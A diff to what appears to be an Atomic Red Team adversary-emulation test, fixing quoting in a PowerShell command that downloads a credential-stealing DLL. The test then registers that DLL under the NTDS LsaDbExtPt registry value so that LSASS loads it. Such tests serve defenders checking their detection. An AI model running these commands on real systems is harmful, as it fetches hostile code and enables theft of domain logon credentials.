@@ -24,7 +24,7 @@ atomic_tests:
       if (Test-Path #{dll_path}) {exit 0} else {exit 1}
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll" -UseBasicParsing -OutFile "#{dll_path}"
+      Invoke-WebRequest "https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll" -UseBasicParsing -OutFile "#{dll_path}"
   executor:
     command: |
       New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "#{dll_path}"
